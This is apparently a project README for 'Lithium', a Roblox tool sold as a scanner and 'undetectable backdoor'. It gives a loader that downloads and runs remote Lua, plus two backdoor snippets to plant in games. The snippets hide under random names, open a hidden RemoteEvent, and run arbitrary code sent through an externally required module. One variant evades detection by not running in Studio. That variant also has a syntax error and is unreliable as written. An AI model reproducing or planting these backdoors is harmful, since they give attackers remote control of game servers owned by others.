<h1 align="center">Lithium</h1>
<p align="center">Backdoor Scanner for Roblox</p>

---

- ⚡ Powerful Executor
- ✅ Undetectable Backdoor
- 😎 Simple UI

---

### Scanner
```lua
loadstring(game:HttpGet("https://raw.githubusercontent.com/Bbblaxtop/Lithium-Roblox/refs/heads/main/src/scanner.lua"))()
```

### Backdoor
```lua
script.Name = game.HttpService:GenerateGUID(false); script.Parent = game:GetService("Chat"); local s1 = Instance.new("RemoteEvent"); s1.Parent = game.LocalizationService; s1.Name = game.HttpService:GenerateGUID(false); s1.OnServerEvent:Connect(function(s2,s3) local s4 = require(14382140693) s4(s3)() end)
```

### Backdoor Non Studio
```lua
if not game:GetService("RunService"):IsStudio() script.Name = game.HttpService:GenerateGUID(false); script.Parent = game:GetService("Chat"); local s1 = Instance.new("RemoteEvent"); s1.Parent = game.LocalizationService; s1.Name = game.HttpService:GenerateGUID(false); s1.OnServerEvent:Connect(function(s2,s3) local s4 = require(14382140693) s4(s3)() end) end
```
